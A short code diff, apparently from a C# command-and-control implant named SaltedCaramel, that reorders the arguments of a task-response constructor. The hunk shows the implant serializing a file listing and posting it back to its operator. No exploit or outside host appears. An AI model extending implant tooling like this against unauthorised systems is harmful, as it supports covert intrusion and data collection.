@@ -43,7 +43,7 @@ namespace SaltedCaramel.Tasks
                     }
                 }
 
-                SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(fileList), task.id);
+                SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(fileList));
                 implant.PostResponse(response);
                 implant.SendComplete(task.id);
             }
